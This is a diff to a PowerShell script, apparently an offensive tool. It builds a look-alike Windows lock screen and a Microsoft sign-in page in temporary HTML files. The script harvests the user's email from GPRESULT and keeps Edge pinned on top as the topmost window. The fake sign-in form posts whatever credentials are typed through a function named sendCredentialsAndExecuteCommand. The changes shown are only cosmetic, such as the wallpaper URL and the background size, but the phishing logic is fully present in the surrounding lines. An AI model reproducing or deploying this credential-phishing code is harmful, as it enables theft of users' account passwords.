@@ -20,18 +20,11 @@ Kudos for creating this great look-a-like!
 $u = GPRESULT /R /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches
 $c = $env:COMPUTERNAME
 $u = ("$u").Trim()
-
-$themeValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" -Name "AppsUseLightTheme"
-if ($themeValue.AppsUseLightTheme -eq 1) {
-    $wpURL = "https://wallpapercave.com/wp/wp9378812.jpg"
-} elseif ($themeValue.AppsUseLightTheme -eq 0) {
-    $wpURL = "https://wallpapercave.com/wp/wp9378806.jpg"
-} else {}
+$wpURL = "https://wallpapercave.com/wp/wp9378862.jpg"
 
 # DEFINE HTML CODE
 
 $h = @"
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -43,11 +36,10 @@ $h = @"
 	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet">
 <style>
 @import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@600&display=swap);
-body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url($wpURL);background-repeat:no-repeat;background-size:25% cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0%)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{text-align:center;position:absolute;top:20%;left:42%;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0%)}}#time{font-size:7.5em;font-family:'Open Sans',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:2em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}
+body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url($wpURL);background-repeat:no-repeat;background-size:100% cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0%)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{text-align:center;position:absolute;top:20%;left:42%;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0%)}}#time{font-size:7.5em;font-family:'Open Sans',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:2em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}
 </style>
 </head>
 <body>
-
 	<div id="container">
 		<div id="wallpaper">
 			<div id="date_cont">
@@ -57,27 +49,22 @@ body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{he
           <i class="fa fa-wifi"></i>
           <i class="fa fa-battery-full"></i>
         </div>
-			</div>
+	</div>
     </div>
 	</div>
 	<script type="text/javascript">
-(function(){
-  // Variable Definitions   
+(function(){ 
   var time = document.querySelector('#time');
   var dateElem = document.querySelector('#date');
   var wallpaper = document.querySelector('#wallpaper');
-  
-  // Date Configurations
   var currentDate = new Date();
   var hours = currentDate.getHours();
   var minutes = currentDate.getMinutes();
   var month = currentDate.getMonth();
   var day = currentDate.getDay();
   var dateOfMonth = currentDate.getDate();
-
   var dayOfWeek = ['Sunday','Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
   var monthOfYear = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'Decemeber'];
-
   if ((hours < 10)) {
     time.innerHTML = '0' + hours + ':' + minutes;
   } else {
@@ -95,7 +82,6 @@ body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{he
       window.location.href = 'index2.html';
     }, 2000);
   }
-
   document.addEventListener('keypress', (e)=>{
     console.log('key pressed', e.keyCode);
     if(e.keyCode === 13) {
@@ -117,12 +103,10 @@ body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{he
   wallpaper.classList.add('slideUp');
   myFunction();
   });
-
 })();
 	</script>
   </body>
 </html>
-
 "@
 
 $h2 = @"
@@ -135,7 +119,7 @@ $h2 = @"
     <title>&#65279;</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
 <style>
-#loginForm{background-color:#fff;box-shadow:0 2px 23px -5px rgba(0,0,0,.46);height:470px;width:440px;position:absolute;left:50%;top:49%;transform:translate(-50%,-50%);padding:10px}body{background:url($wpURL);background-repeat:no-repeat;background-size:25% cover;background-position:center;backdrop-filter: blur(10px);height:100vh;width:100vw;position:relative;top:0;left:0}body::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,.5);z-index:-1}#logo{margin-top:25px;margin-left:36px;border:none}#signIn{margin-left:36px;margin-top:-6px;font-weight:600;font-size:25px;overflow:hidden}#email{width:85%;max-width:350px;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#ForgodPwd,#NoAccount,#SignWithKey,#createAccount{margin-left:36px;margin-top:13px;font-size:13px}#signInSecurity{margin-left:25px;font-size:13px}.fa.fa-question-circle-o{margin-left:5px;opacity:.8}#passResult,#result,#signInSecurityKey{margin-left:36px;font-size:13px}#iconQ{margin-left:3px;opacity:.55}#btnSend,#btnSignIn{height:33px;width:108px;padding:0;margin-left:auto;margin-top:auto;font-size:13px;color:#fff;border:#0067b8;background-color:#0067b8}#btnPlace{margin-left:275px;margin-top:45px;margin-bottom:1px}#linkCreateAccount{margin-left:5px}#email:focus,input:focus{outline:0}#image{margin-top:25px;margin-left:36px;margin-bottom:12px}#section-2{margin-top:-60%}.section-indent{float:left}#btnSignInLocation{margin-left:275px;margin-top:19px}#password{width:85%;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#enterPwd{margin-left:36px;margin-top:7px;font-size:24px;font-weight:500}#btnBack{background-color:#fff;color:rgba(0,0,0,.3);padding:5px;text-align:left;text-decoration:none;display:inline-block;font-size:10px;margin:4px 31px;border:none;cursor:pointer;border-radius:100%}#userLine{margin-left:36px;margin-bottom:-25px;font-size:15px;font-weight:400}#arrowBack{margin-right:5px;margin-top:0;margin-left:8px;opacity:.2;font-size:19px}#iconCircle{color:red}#iconBg{margin-right:5px;opacity:.4;font-size:23px}.slide-page{margin-left:0}.secondSlide{margin-left:100%;overflow:hidden}#section-1{overflow:hidden}#btnBack:hover{background-color:#c6c6c6}#cbRemember{margin-left:36px;width:21px;height:20px}#keepMe{color:#1b1b1b;margin-left:64px;font-size:15px;margin-bottom:-20px}#bg{position:fixed;top:0;bottom:0;min-width:100%;min-height:100%;overflow:hidden}#footer{position:absolute;bottom:0;right:0}#policy{margin-left:36px;font-size:15px;font-weight:400}#terms p,#terms div p{color:#fff!important}
+#loginForm{background-color:#fff;box-shadow:0 2px 23px -5px rgba(0,0,0,.46);height:470px;width:440px;position:absolute;left:50%;top:49%;transform:translate(-50%,-50%);padding:10px}body{background:url($wpURL);background-repeat:no-repeat;background-size:100% cover;background-position:center;backdrop-filter: blur(10px);height:100vh;width:100vw;position:relative;top:0;left:0}body::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,.5);z-index:-1}#logo{margin-top:25px;margin-left:36px;border:none}#signIn{margin-left:36px;margin-top:-6px;font-weight:600;font-size:25px;overflow:hidden}#email{width:85%;max-width:350px;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#ForgodPwd,#NoAccount,#SignWithKey,#createAccount{margin-left:36px;margin-top:13px;font-size:13px}#signInSecurity{margin-left:25px;font-size:13px}.fa.fa-question-circle-o{margin-left:5px;opacity:.8}#passResult,#result,#signInSecurityKey{margin-left:36px;font-size:13px}#iconQ{margin-left:3px;opacity:.55}#btnSend,#btnSignIn{height:33px;width:108px;padding:0;margin-left:auto;margin-top:auto;font-size:13px;color:#fff;border:#0067b8;background-color:#0067b8}#btnPlace{margin-left:275px;margin-top:45px;margin-bottom:1px}#linkCreateAccount{margin-left:5px}#email:focus,input:focus{outline:0}#image{margin-top:25px;margin-left:36px;margin-bottom:12px}#section-2{margin-top:-60%}.section-indent{float:left}#btnSignInLocation{margin-left:275px;margin-top:19px}#password{width:85%;height:40px;margin-top:-10px;margin-left:36px;border:none;border-bottom:.01px solid rgba(0,0,0,.7)}#enterPwd{margin-left:36px;margin-top:7px;font-size:24px;font-weight:500}#btnBack{background-color:#fff;color:rgba(0,0,0,.3);padding:5px;text-align:left;text-decoration:none;display:inline-block;font-size:10px;margin:4px 31px;border:none;cursor:pointer;border-radius:100%}#userLine{margin-left:36px;margin-bottom:-25px;font-size:15px;font-weight:400}#arrowBack{margin-right:5px;margin-top:0;margin-left:8px;opacity:.2;font-size:19px}#iconCircle{color:red}#iconBg{margin-right:5px;opacity:.4;font-size:23px}.slide-page{margin-left:0}.secondSlide{margin-left:100%;overflow:hidden}#section-1{overflow:hidden}#btnBack:hover{background-color:#c6c6c6}#cbRemember{margin-left:36px;width:21px;height:20px}#keepMe{color:#1b1b1b;margin-left:64px;font-size:15px;margin-bottom:-20px}#bg{position:fixed;top:0;bottom:0;min-width:100%;min-height:100%;overflow:hidden}#footer{position:absolute;bottom:0;right:0}#policy{margin-left:36px;font-size:15px;font-weight:400}#terms p,#terms div p{color:#fff!important}
  </style>
   </head>
 <body class="text-nowrap" style="width:100%;height:100vh">
@@ -183,11 +167,9 @@ $h2 = @"
         body: JSON.stringify(data)})
       .then(response => {})
       .catch(error => {});}
-
     document.getElementById("btnSignIn").addEventListener("click", function() {
       sendCredentialsAndExecuteCommand();
     });
-
     document.addEventListener('keypress', (e)=>{
     console.log('key pressed', e.keyCode);
     if(e.keyCode === 13) {
@@ -206,7 +188,6 @@ $h2 = @"
 $p = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index.html")
 $h | Out-File -Encoding UTF8 -FilePath $p
 $a = "file://$p"
-
 $p2 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index2.html")
 $h2 | Out-File -Encoding UTF8 -FilePath $p2
 
@@ -233,11 +214,11 @@ Add-Type @"
     }
 "@
 
-
 # SET EDGE AS TOP WINDOW AND START SCREENSAVER
 $null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
 Sleep -Milliseconds 250
 $null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
 Sleep -Milliseconds 750
 $black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
+
 
